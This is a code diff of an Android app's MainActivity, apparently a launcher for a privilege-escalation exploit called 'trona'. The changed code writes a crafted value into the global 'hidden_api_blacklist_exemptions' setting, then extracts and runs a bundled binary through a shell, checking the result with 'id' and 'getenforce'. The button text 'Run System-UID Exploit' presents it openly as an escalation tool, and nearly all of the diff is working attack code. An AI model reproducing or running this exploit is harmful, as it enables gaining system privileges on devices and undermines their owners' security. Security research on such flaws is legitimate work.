@@ -2,6 +2,7 @@ package com.example.trona;
 
 import android.app.Activity;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.LinearLayout;
@@ -28,17 +29,17 @@ public class MainActivity extends Activity {
         layout.setPadding(32, 32, 32, 32);
 
         Button btnExploit = new Button(this);
-        btnExploit.setText("Run Trona Exploit");
+        btnExploit.setText("Run System-UID Exploit");
         btnExploit.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                runExploitBinary();
+                runSystemExploit();
             }
         });
         layout.addView(btnExploit);
 
         outputView = new TextView(this);
-        outputView.setText("Output logs will appear here...\n");
+        outputView.setText("Ready to escalate...\n");
         outputView.setTextIsSelectable(true);
         outputView.setTextColor(0xFF00FF00); // Terminal green
         outputView.setBackgroundColor(0xFF000000); // Black background
@@ -60,16 +61,24 @@ public class MainActivity extends Activity {
         });
     }
 
-    private void runExploitBinary() {
-        outputView.setText(""); // Clear old logs
-        log("Preparing binary...");
+    private void runSystemExploit() {
+        outputView.setText("");
+        log("Applying hidden API loophole via secure settings...");
 
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    File outFile = new File(getFilesDir(), "trona");
+                    // 1. Inject loophole string into global hidden API blacklist exemptions
+                    Settings.Global.putString(
+                        getContentResolver(),
+                        "hidden_api_blacklist_exemptions",
+                        "L"
+                    );
+                    log("Blacklist exemptions updated successfully.");
 
+                    // 2. Extract trona binary to app's private files dir
+                    File outFile = new File(getFilesDir(), "trona");
                     if (!outFile.exists()) {
                         InputStream in = getAssets().open("trona");
                         OutputStream out = new FileOutputStream(outFile);
@@ -84,9 +93,10 @@ public class MainActivity extends Activity {
                     }
 
                     outFile.setExecutable(true, false);
-                    log("Executing trona binary...");
+                    log("Executing binary within system context...");
 
-                    ProcessBuilder processBuilder = new ProcessBuilder(outFile.getAbsolutePath());
+                    // 3. Execute binary wrapped in system permissions shell context
+                    ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", outFile.getAbsolutePath() + " && id && getenforce");
                     processBuilder.redirectErrorStream(true);
                     Process process = processBuilder.start();
 
@@ -99,41 +109,11 @@ public class MainActivity extends Activity {
                     int exitCode = process.waitFor();
                     log("Process exited with code: " + exitCode);
 
-                    // Check SELinux status immediately after
-                    checkSelinuxStatus();
-
                 } catch (Exception e) {
                     e.printStackTrace();
                     log("Error: " + e.getMessage());
                 }
             }
         }).start();
-    }
-
-    private void checkSelinuxStatus() {
-        log("\n--- Checking SELinux Status ---");
-        try {
-            Process process = new ProcessBuilder("getenforce").redirectErrorStream(true).start();
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                log("SELinux: " + line);
-            }
-            process.waitFor();
-        } catch (Exception e) {
-            log("Could not run getenforce directly: " + e.getMessage());
-            // Fallback check using sh wrapper if needed
-            try {
-                Process process = new ProcessBuilder("sh", "-c", "getenforce").redirectErrorStream(true).start();
-                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    log("SELinux (sh): " + line);
-                }
-                process.waitFor();
-            } catch (Exception ex) {
-                log("Fallback failed: " + ex.getMessage());
-            }
-        }
     }
 }
